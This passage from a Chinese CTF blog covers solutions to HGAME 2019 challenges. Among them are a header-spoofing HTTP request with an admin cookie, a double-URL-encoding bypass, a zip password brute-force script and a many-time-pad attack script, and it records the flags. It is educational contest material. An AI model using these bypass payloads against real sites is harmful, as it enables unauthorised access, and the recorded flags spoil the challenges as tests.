uojlwjy. Nlw Noaifwxy gahnyv osy ivayohedde xikuxcfwv hs Kagbur Tsznmklg Viddgms af ncw gfk nlgmyurv xopi zmtxvwv ghh xalnc-gfk vsgc Ru gaxxu hwd. Yck. Yaupef Tgnxakzu Fwdruwg, tan xzw ywlwek qek dgnij eomellxcfmlkx xg Trumkw jy Zaykhijw oh xzw tcrwln wiflalc sfj ms suwomjwj cxk hxywwfz heew. lfey ay ajqmenycpglmqqjzndhrqwpvhtaniz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key: guess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The Vigenere ciphe is a method of encrypting alphabetic text by using a series of interwoven Caesar ciphers, based on the letters of a keyword. It is a form of polyalphabetic substitution. The cipher is easy to understand and implement, but it resisted all attempts to break it for three centuries, which earned it the description le chiffre indechiffrable. Many people have tried to implement encryption schemes that are essentially Vigenere ciphers. In eighteen sixty three, Friedrich Kasiski was the first to publish a general method of deciphering Vigenere ciphers. The Vigenere cipher was originally described by Giovan Battista Bellaso in his one thousand five hundred and fifty-one book La cifra del. Sig. Giovan Battista Bellaso, but the scheme was later misattributed to Blaise de Vigenere in the nineth century and so acquired its present name. flag is gfyuytukxariyydfjlplwsxdbzwvqt</span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Are-You-Familiar-with-DNS-Records"><a href="#Are-You-Familiar-with-DNS-Records" class="headerlink" title="Are You Familiar with DNS Records?"></a>Are You Familiar with DNS Records?</h2><blockquote><p>Description<br>well, you know, this is a song-fen-ti, have fun! XD<br>然并卵的hint: DNS 有很多种不一样的记录类型，其中一种类型如果没有正确设置就可能被其他邮件服务器拒收，flag 就在此域名的第二条此类型记录里<br>URL <a href="http://project-a11.club/">http://project-a11.club/</a></p></blockquote><p><a href="https://tool.lu/dns/index.html">https://tool.lu/dns/index.html</a>      TXT类型记录</p><p><img src="https://i.loli.net/2019/02/23/5c70c0976f969.png"></p><h2 id="快到火炉旁找个位置坐坐！"><a href="#快到火炉旁找个位置坐坐！" class="headerlink" title="快到火炉旁找个位置坐坐！"></a>快到火炉旁找个位置坐坐！</h2><blockquote><p>Description<br>1.从炉石传说导出的套牌为啥不能用了=。= ,还原它 2.flag为hgame{修复后的代码} 套牌代码： hint:出题人首先对数量做了些事情=。= AAECAf0EBu0FuAju9gLQwQIMigGcAq4DyQOrBMsE5gSYxALaxQKW5AK0/ALSiQOmmAMA<br>URL <a href="http://example.com/">http://example.com/</a></p></blockquote><p>参考链接  <a href="https://zhangshuqiao.org/2018-12/%E7%82%89%E7%9F%B3%E5%8D%A1%E7%BB%84%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90/">https://zhangshuqiao.org/2018-12/%E7%82%89%E7%9F%B3%E5%8D%A1%E7%BB%84%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90/</a></p><h2 id="找得到我嘛？小火汁"><a href="#找得到我嘛？小火汁" class="headerlink" title="找得到我嘛？小火汁"></a>找得到我嘛？小火汁</h2><blockquote><p>Description<br>ε=ε=ε=ε=ε=ε=┌(;￣◇￣)┘<br>hint: Https<br>URL <a href="http://plir4axuz.bkt.clouddn.com/hgame2019/orz/safe.pcapng">http://plir4axuz.bkt.clouddn.com/hgame2019/orz/safe.pcapng</a></p></blockquote><p>FTP中找到一个压缩包，拉出来解压后发现是一个<code>secret.log</code></p><p><img src="https://i.loli.net/2019/02/23/5c70e36896b4e.png"></p><p>带到流量包中，解密<code>https流量</code>：编辑——首选项——Protocols——SSL，加载得到的log。然后导出http对象，发现多出一个<code>1.tar</code>。</p><p><img src="https://i.loli.net/2019/02/23/5c70e43e6dcf1.png"></p><p>解压得到<code>flag.jpg</code>，winhex打开或者exiftool打开都可以看到flag。</p><p><img src="https://i.loli.net/2019/02/23/5c70e1aa3b922.png"></p><h2 id="初识二维码"><a href="#初识二维码" class="headerlink" title="初识二维码"></a>初识二维码</h2><blockquote><p>Description<br>你知道吗，二维码就算有缺损也能扫出来哦<br>hint:1.DataURI 2.QRcode基本结构<br>URL <a href="http://plqfgjy5a.bkt.clouddn.com/%E5%88%9D%E8%AF%86%E4%BA%8C%E7%BB%B4%E7%A0%81.zip">http://plqfgjy5a.bkt.clouddn.com/%E5%88%9D%E8%AF%86%E4%BA%8C%E7%BB%B4%E7%A0%81.zip</a></p></blockquote><p>URI字符串可以转成图片，得到</p><p><img src="https://i.loli.net/2019/02/23/5c70ed550a8bb.png"></p><p>对比二维码的基本结构，我们可以发现少了定位标志和定时标志：</p><p><img src="https://i.loli.net/2019/02/23/5c70edaead8df.png"></p><p>题目中缺损二维码尺寸是2626，正常二维码的尺寸是<code>((V-1)*4+21)*((V-1)*4+21)</code>（V=版本号），定位符尺寸固定为7*7,在这个网站<a href="https://merricx.github.io/qrazybox/%E4%B8%8A%E5%8F%AF%E4%BB%A5%E8%BD%BB%E6%9D%BE%E4%BF%AE%E5%A4%8D%E4%BF%AE%E5%A4%8D%E5%90%8E%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81%E4%B8%BA">https://merricx.github.io/qrazybox/上可以轻松修复修复后的二维码为</a></p><p><img src="https://i.loli.net/2019/02/23/5c70ee701f2f3.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;Qu1ck_ReSp0nse_cODe&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杭电Hgame2019-week1-WP</title>
      <link href="/2019/02/01/Hgame2019-week1WP/"/>
      <url>/2019/02/01/Hgame2019-week1WP/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>说来也是有一点感慨的，去年我也是以萌新的身份参加的杭电hgame，我的第一篇博客好像也是那时候写的呢！算是有纪念意义呢，一年来学了一点知识，想再做一遍，看看菜鸡的水平有没有一星半点的成长。我主要做<code>Web+Misc+Crypto</code>，作为REbeginner，RE比较简单的，可以做一做，太菜了==、</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="谁偷了我的flag"><a href="#谁偷了我的flag" class="headerlink" title="谁偷了我的flag"></a>谁偷了我的flag</h2><blockquote><p>描述<br>呜呜呜，Mki一起床发现写好的题目变成这样了，是因为昨天没有好好关机吗T_T<br>URL <a href="http://118.25.111.31:10086/index.html">http://118.25.111.31:10086/index.html</a></p></blockquote><p>算是很清晰的了，vim非正常关机产生swp文件。本题为<code>.index.html.swp</code>，<code>vim -r index.html.swp</code>还原。  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;3eek_diScl0Sure_fRom+wEbsit@&#125;</span><br></pre></td></tr></table></figure><h2 id="换头大作战"><a href="#换头大作战" class="headerlink" title="换头大作战"></a>换头大作战</h2><blockquote><p>描述<br>想要flag嘛<br>URL  <a href="http://120.78.184.111:8080/week1/how/index.php">http://120.78.184.111:8080/week1/how/index.php</a></p></blockquote><ol><li>POST</li><li>X-Forwarded-For</li><li>User-Agent</li><li>Referer</li><li>Cookie:admin=1</li></ol><p>payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;week1&#x2F;how&#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: 120.78.184.111:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko&#x2F;20100101 Waterfox&#x2F;50.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Referer: www.bilibili.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 9</span><br><span class="line">Cookie: admin&#x3D;1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line"></span><br><span class="line">want&#x3D;flag</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;hTTp_HeaDeR_iS_Ez&#125;</span><br></pre></td></tr></table></figure><h2 id="very-easy-web"><a href="#very-easy-web" class="headerlink" title="very easy web"></a>very easy web</h2><blockquote><p>描述<br>代码审计初♂体验<br>URL   <a href="http://120.78.184.111:8080/week1/very_ez/index.php">http://120.78.184.111:8080/week1/very_ez/index.php</a></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strpos(<span class="string">&quot;vidar&quot;</span>,$_GET[<span class="string">&#x27;id&#x27;</span>])!==<span class="literal">FALSE</span>)</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;&lt;p&gt;干巴爹&lt;/p&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">$_GET[<span class="string">&#x27;id&#x27;</span>] = urldecode($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;id&#x27;</span>] === <span class="string">&quot;vidar&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>easy，发送数据会自动进行一次urldecode，故payload需要两次urlencode。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;%%37%36%69dar</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;urlDecode_Is_GoOd&#125;</span><br></pre></td></tr></table></figure><h2 id="can-u-find-me"><a href="#can-u-find-me" class="headerlink" title="can u find me?"></a>can u find me?</h2><blockquote><p>描述<br>为什么不问问神奇的十二姑娘和她的小伙伴呢<br>URL <a href="http://47.107.252.171:8080/">http://47.107.252.171:8080/</a></p></blockquote><p>看源码，得<code>&lt;a href=&quot;f12.php&quot;&gt;&lt;/a&gt;</code>跟进</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">but can you find the password?</span><br><span class="line">please post password to me! I will open the gate for you!</span><br></pre></td></tr></table></figure><p>发现要密码，在响应头中发现密码：<code>password=woyaoflag</code></p><p>提交得到超链接，但是有302跳转，可以使用burp，得到flag。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;f12_1s_aMazIng111&#125;</span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Hidden-Image-in-LSB"><a href="#Hidden-Image-in-LSB" class="headerlink" title="Hidden Image in LSB"></a>Hidden Image in LSB</h2><blockquote><p>描述<br>Here are some magic codes which can hide information in an ordinary picture, can you extract the hidden image in the provided picture?<br>其实本来想让大家写写代码，后来干脆就送分了<br>有个神器叫 stegsolve，利用它可以直接提取本题 flag<br>URL <a href="http://plir4axuz.bkt.clouddn.com/hgame2019/lsb.zip">http://plir4axuz.bkt.clouddn.com/hgame2019/lsb.zip</a></p></blockquote><p>LSB</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;LSB_is_easy_for_u&#125;</span><br></pre></td></tr></table></figure><h2 id="打字机"><a href="#打字机" class="headerlink" title="打字机"></a>打字机</h2><blockquote><p>描述<br>Aris(划掉)牌打字机，时尚时尚最时尚~<br>hint:谷歌有个以图搜图功能很不错，百度识图好垃圾的。。。<br>URL <a href="http://plps4kyke.bkt.clouddn.com/%E6%89%93%E5%AD%97%E6%9C%BA.zip">http://plps4kyke.bkt.clouddn.com/打字机.zip</a></p></blockquote><p>看着眼熟，google一下确实是京紫的打字机，找到对应的英文字母<br><a href="https://www.bilibili.com/read/cv194341/">https://www.bilibili.com/read/cv194341/</a><br><a href="https://www.bilibili.com/read/cv154778/">https://www.bilibili.com/read/cv154778/</a></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/google%E7%BB%93%E6%9E%9C.jpg"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;My_vi0let_tyPewRiter&#125;</span><br></pre></td></tr></table></figure><p>中间的<code>0</code>有点坑，没啥意思。</p><h2 id="Broken-Chest"><a href="#Broken-Chest" class="headerlink" title="Broken Chest"></a>Broken Chest</h2><blockquote><p>描述<br>这个箱子坏掉了！快用你无敌的[疯狂钻石]想想办法啊！<br>更新一波学习资料<a href="https://ctf-wiki.github.io/ctf-wiki/misc/archive/zip/">https://ctf-wiki.github.io/ctf-wiki/misc/archive/zip/</a><br>URL<br><a href="http://plqfgjy5a.bkt.clouddn.com/Broken-Chest.zip">http://plqfgjy5a.bkt.clouddn.com/Broken-Chest.zip</a></p></blockquote><p>压缩包坏了，秉着应该不会难的想法，winhex打开，发现第一个字节有问题，修改完后打开，发现需要密码，看到注释，得到密码<code>S0mETh1ng_U5efuL</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;Cra2y_D1aM0nd&#125;</span><br></pre></td></tr></table></figure><h2 id="Try"><a href="#Try" class="headerlink" title="Try"></a>Try</h2><blockquote><p>描述<br>无字天书<br>URL <a href="http://plqfgjy5a.bkt.clouddn.com/try-it.pcapng">http://plqfgjy5a.bkt.clouddn.com/try-it.pcapng</a></p></blockquote><p>数据包分析，追踪一个有压缩包的流，得到压缩包的数据。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/2019-01-29_00001.png"></p><p>得到一个压缩包，发现里面有一个password.txt提示我们密码是<code>hgame********</code>说明有八位不确定==、爆破，先按照全数字爆破。</p><p>写了一个字典，脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools <span class="keyword">as</span> its</span><br><span class="line">words = <span class="string">&quot;0123456789&quot;</span></span><br><span class="line"></span><br><span class="line">r = its.product(words,repeat=<span class="number">8</span>)</span><br><span class="line">f = open(<span class="string">&quot;dic.txt&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> r:</span><br><span class="line">f.write(<span class="string">&#x27;hgame&#x27;</span>)</span><br><span class="line">f.write(<span class="string">&quot;&quot;</span>.join(i))</span><br><span class="line">f.write(<span class="string">&quot;&quot;</span>.join(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>跑字典得到压缩密码</p><p><img src="https://i.loli.net/2019/01/30/5c515d53bedcd.png"></p><p>解压得到一个1.jpg</p><p>winhex发现有一个zip在文件末尾，提取出来，伪加密，解压得到一个1.doc。打开发现没东西，显示隐藏文字后出现flag。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;59d28413e36019861498e823f3f41406&#125;</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Mix"><a href="#Mix" class="headerlink" title="Mix"></a>Mix</h2><blockquote><p>描述<br>–…/….-/….-/-…/–…/…–/…../..-./-…./-../-…./..-./–…/—-./….-/….-/–…/.—-/-…./-…/–…/-…/-…./..—/…../.—-/-…./-…./…–/….-/…–/—–/-…./…../–…/-.. So easy</p></blockquote><p>莫斯+hex+凯撒+栅栏</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;E4sY_cRypt0&#125;</span><br></pre></td></tr></table></figure><h2 id="perfect-secrecy"><a href="#perfect-secrecy" class="headerlink" title="perfect_secrecy!"></a>perfect_secrecy!</h2><blockquote><p>描述<br>Mom told me OTP is perfect secrecy!（结果加上hgame{}）<br>URL <a href="http://plqbnxx54.bkt.clouddn.com/easy_otp.py">http://plqbnxx54.bkt.clouddn.com/easy_otp.py</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strxor</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(hex(x ^ y)[<span class="number">2</span>:].zfill(<span class="number">2</span>) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> zip(a, b))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strunhex</span>(<span class="params">s</span>):</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(binascii.a2b_hex(s))</span><br><span class="line"></span><br><span class="line">fp = open(<span class="string">&#x27;poem.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">flag = <span class="string">&quot;*********************************&quot;</span></span><br><span class="line">strings = fp.readlines()</span><br><span class="line">strs = [strxor(i[:<span class="number">-3</span>], binascii.unhexlify(key)) <span class="keyword">for</span> i <span class="keyword">in</span> strings]</span><br><span class="line">result = strxor(flag.encode(<span class="string">&#x27;utf-8&#x27;</span>), binascii.unhexlify(key))</span><br><span class="line">print(strs)</span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">output:</span></span><br><span class="line"><span class="string">[&#x27;daaa4b4e8c996dc786889cd63bc4df4d1e7dc6f3f0b7a0b61ad48811f6f7c9bfabd7083c53ba54&#x27;,</span></span><br><span class="line"><span class="string">&#x27;c5a342468c8c7a88999a9dd623c0cc4b0f7c829acaf8f3ac13c78300b3b1c7a3ef8e193840bb&#x27;,</span></span><br><span class="line"><span class="string">&#x27;dda342458c897a8285df879e3285ce511e7c8d9afff9b7ff15de8a16b394c7bdab920e7946a05e9941d8308e&#x27;,</span></span><br><span class="line"><span class="string">&#x27;d9b05b4cd5ce7c8f938bd39e24d0df191d7694dfeaf8bfbb56e28900e1b8dff1bb985c2d5aa154&#x27;,</span></span><br><span class="line"><span class="string">&#x27;d9aa4b00c88b7fc79d99d38223c08d54146b88d3f0f0f38c03df8d52f0bfc1bda3d7133712a55e9948c32c8a&#x27;,</span></span><br><span class="line"><span class="string">&#x27;c4b60e46c9827cc79e9698936bd1c55c5b6e87c8f0febdb856fe8052e4bfc9a5efbe5c3f57ad4b9944de34&#x27;,</span></span><br><span class="line"><span class="string">&#x27;d9aa5700da817f94d29e81936bc4c1555b7b94d5f5f2bdff37df8252ffbecfb9bbd7152a12bc4fc00ad7229090&#x27;,</span></span><br><span class="line"><span class="string">&#x27;c4e24645cd9c28939a86d3982ac8c819086989d1fbf9f39e18d5c601fbb6dab4ef9e12795bbc549959d9229090&#x27;,</span></span><br><span class="line"><span class="string">&#x27;d9aa4b598c80698a97df879e2ec08d5b1e7f89c8fbb7beba56f0c619fdb2c4bdef8313795fa149dc0ad4228f&#x27;,</span></span><br><span class="line"><span class="string">&#x27;cce25d48d98a6c8280df909926c0de19143983c8befab6ff21d99f52e4b2daa5ef83143647e854d60ad5269c87&#x27;,</span></span><br><span class="line"><span class="string">&#x27;d9aa4b598c85668885df9d993f85e419107783cdbee3bbba1391b11afcf7c3bfaa805c2d5aad42995ede2cdd82977244&#x27;,</span></span><br><span class="line"><span class="string">&#x27;e1ad40478c82678995df809e2ac9c119323994cffbb7a7b713d4c626fcb888b5aa920c354be853d60ac5269199&#x27;,</span></span><br><span class="line"><span class="string">&#x27;c4ac0e53c98d7a8286df84936bc8c84d5b50889aedfebfba18d28352daf7cfa3a6920a3c&#x27;,</span></span><br><span class="line"><span class="string">&#x27;d9aa4f548c9a609ed297969739d18d5a146c8adebef1bcad11d49252c7bfd1f1bc87152b5bbc07dd4fd226948397&#x27;,</span></span><br><span class="line"><span class="string">&#x27;c4a40e698c9d6088879397d626c0c84d5b6d8edffbb792b902d49452ffbec6b6ef8e193840&#x27;,</span></span><br><span class="line"><span class="string">&#x27;c5ad5900df8667929e9bd3bf6bc2df5c1e6dc6cef6f2b6ff21d8921ab3a4c1bdaa991f3c12a949dd0ac5269c&#x27;]</span></span><br><span class="line"><span class="string">&#x27;c2967e7fc59d57899d8bac852ac3c866127fb9d7f1e5b68002d9871cccb8c6b2aa&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>题目意图很明显，<strong>一次安全的密钥，但是多次使用还安全吗</strong></p><p>很显然，答案是否定的，多次使用一个密钥进行加密尤其是异或时，很容易出现安全问题。</p><p>参考这两篇文章<a href="https://www.anquanke.com/post/id/161171">小记一类ctf密码题解题思路</a>，<a href="http://dann.com.br/alexctf2k17-crypto100-many_time_secrets/">http://dann.com.br/alexctf2k17-crypto100-many_time_secrets/</a></p><p>一般的解法有两种，<strong>一是通过字母出现的频率统计规律进行权重赋值。其实说白了就是字频攻击。</strong></p><p><strong>二是合理利用明文的空格</strong></p><blockquote><p>这种方法其实是利用了一个异或的规律和一个小技巧。空格和所有小写字母异或结果是相应的大写字母，空格和所有大写字母异或是相应的小写字母</p></blockquote><p>我是用国外那位大佬的脚本跑的。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017</span></span><br><span class="line"><span class="comment"># @author intrd - http://dann.com.br/ </span></span><br><span class="line"><span class="comment"># Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> sets, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 11 unknown ciphertexts (in hex format), all encrpyted with the same key</span></span><br><span class="line">c1 = <span class="string">&#x27;daaa4b4e8c996dc786889cd63bc4df4d1e7dc6f3f0b7a0b61ad48811f6f7c9bfabd7083c53ba54&#x27;</span></span><br><span class="line">c2 = <span class="string">&#x27;c5a342468c8c7a88999a9dd623c0cc4b0f7c829acaf8f3ac13c78300b3b1c7a3ef8e193840bb&#x27;</span></span><br><span class="line">c3 = <span class="string">&#x27;dda342458c897a8285df879e3285ce511e7c8d9afff9b7ff15de8a16b394c7bdab920e7946a05e9941d8308e&#x27;</span></span><br><span class="line">c4 = <span class="string">&#x27;d9b05b4cd5ce7c8f938bd39e24d0df191d7694dfeaf8bfbb56e28900e1b8dff1bb985c2d5aa154&#x27;</span></span><br><span class="line">c5 = <span class="string">&#x27;d9aa4b00c88b7fc79d99d38223c08d54146b88d3f0f0f38c03df8d52f0bfc1bda3d7133712a55e9948c32c8a&#x27;</span></span><br><span class="line">c6 = <span class="string">&#x27;c4b60e46c9827cc79e9698936bd1c55c5b6e87c8f0febdb856fe8052e4bfc9a5efbe5c3f57ad4b9944de34&#x27;</span></span><br><span class="line">c7 = <span class="string">&#x27;d9aa5700da817f94d29e81936bc4c1555b7b94d5f5f2bdff37df8252ffbecfb9bbd7152a12bc4fc00ad7229090&#x27;</span></span><br><span class="line">c8 = <span class="string">&#x27;c4e24645cd9c28939a86d3982ac8c819086989d1fbf9f39e18d5c601fbb6dab4ef9e12795bbc549959d9229090&#x27;</span></span><br><span class="line">c9 = <span class="string">&#x27;d9aa4b598c80698a97df879e2ec08d5b1e7f89c8fbb7beba56f0c619fdb2c4bdef8313795fa149dc0ad4228f&#x27;</span></span><br><span class="line">c10 = <span class="string">&#x27;cce25d48d98a6c8280df909926c0de19143983c8befab6ff21d99f52e4b2daa5ef83143647e854d60ad5269c87&#x27;</span></span><br><span class="line">c11 = <span class="string">&#x27;d9aa4b598c85668885df9d993f85e419107783cdbee3bbba1391b11afcf7c3bfaa805c2d5aad42995ede2cdd82977244&#x27;</span></span><br><span class="line">c12 = <span class="string">&#x27;e1ad40478c82678995df809e2ac9c119323994cffbb7a7b713d4c626fcb888b5aa920c354be853d60ac5269199&#x27;</span></span><br><span class="line">c13 = <span class="string">&#x27;c4ac0e53c98d7a8286df84936bc8c84d5b50889aedfebfba18d28352daf7cfa3a6920a3c&#x27;</span></span><br><span class="line">c14 = <span class="string">&#x27;d9aa4f548c9a609ed297969739d18d5a146c8adebef1bcad11d49252c7bfd1f1bc87152b5bbc07dd4fd226948397&#x27;</span></span><br><span class="line">c15 = <span class="string">&#x27;c4a40e698c9d6088879397d626c0c84d5b6d8edffbb792b902d49452ffbec6b6ef8e193840&#x27;</span></span><br><span class="line">c16 = <span class="string">&#x27;c5ad5900df8667929e9bd3bf6bc2df5c1e6dc6cef6f2b6ff21d8921ab3a4c1bdaa991f3c12a949dd0ac5269c&#x27;</span></span><br><span class="line"></span><br><span class="line">ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11,c12,c13,c14,c15,c16]</span><br><span class="line"><span class="comment"># The target ciphertext we want to crack</span></span><br><span class="line">target_cipher = <span class="string">&#x27;c2967e7fc59d57899d8bac852ac3c866127fb9d7f1e5b68002d9871cccb8c6b2aa&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># XORs two string</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strxor</span>(<span class="params">a, b</span>):</span>     <span class="comment"># xor two strings (trims the longer input)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([chr(ord(x) ^ ord(y)) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> zip(a, b)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># To store the final key</span></span><br><span class="line">final_key = [<span class="literal">None</span>]*<span class="number">150</span></span><br><span class="line"><span class="comment"># To store the positions we know are broken</span></span><br><span class="line">known_key_positions = set()</span><br><span class="line"></span><br><span class="line"><span class="comment"># For each ciphertext</span></span><br><span class="line"><span class="keyword">for</span> current_index, ciphertext <span class="keyword">in</span> enumerate(ciphers):</span><br><span class="line">    counter = collections.Counter()</span><br><span class="line">    <span class="comment"># for each other ciphertext</span></span><br><span class="line">    <span class="keyword">for</span> index, ciphertext2 <span class="keyword">in</span> enumerate(ciphers):</span><br><span class="line">        <span class="keyword">if</span> current_index != index: <span class="comment"># don&#x27;t xor a ciphertext with itself</span></span><br><span class="line">            <span class="keyword">for</span> indexOfChar, char <span class="keyword">in</span> enumerate(strxor(ciphertext.decode(<span class="string">&#x27;hex&#x27;</span>), ciphertext2.decode(<span class="string">&#x27;hex&#x27;</span>))): <span class="comment"># Xor the two ciphertexts</span></span><br><span class="line">                <span class="comment"># If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don&#x27;t know which one)</span></span><br><span class="line">                <span class="keyword">if</span> char <span class="keyword">in</span> string.printable <span class="keyword">and</span> char.isalpha(): counter[indexOfChar] += <span class="number">1</span> <span class="comment"># Increment the counter at this index</span></span><br><span class="line">    knownSpaceIndexes = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Loop through all positions where a space character was possible in the current_index cipher</span></span><br><span class="line">    <span class="keyword">for</span> ind, val <span class="keyword">in</span> counter.items():</span><br><span class="line">        <span class="comment"># If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!</span></span><br><span class="line">        <span class="keyword">if</span> val &gt;= <span class="number">7</span>: knownSpaceIndexes.append(ind)</span><br><span class="line">    <span class="comment">#print knownSpaceIndexes # Shows all the positions where we now know the key!</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!</span></span><br><span class="line">    xor_with_spaces = strxor(ciphertext.decode(<span class="string">&#x27;hex&#x27;</span>),<span class="string">&#x27; &#x27;</span>*<span class="number">150</span>)</span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> knownSpaceIndexes:</span><br><span class="line">        <span class="comment"># Store the key&#x27;s value at the correct position</span></span><br><span class="line">        final_key[index] = xor_with_spaces[index].encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">        <span class="comment"># Record that we known the key at this position</span></span><br><span class="line">        known_key_positions.add(index)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct a hex key from the currently known key, adding in &#x27;00&#x27; hex chars where we do not know (to make a complete hex string)</span></span><br><span class="line">final_key_hex = <span class="string">&#x27;&#x27;</span>.join([val <span class="keyword">if</span> val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">&#x27;00&#x27;</span> <span class="keyword">for</span> val <span class="keyword">in</span> final_key])</span><br><span class="line"><span class="comment"># Xor the currently known key with the target cipher</span></span><br><span class="line">output = strxor(target_cipher.decode(<span class="string">&#x27;hex&#x27;</span>),final_key_hex.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;Fix this sentence:&quot;</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;&#x27;</span>.join([char <span 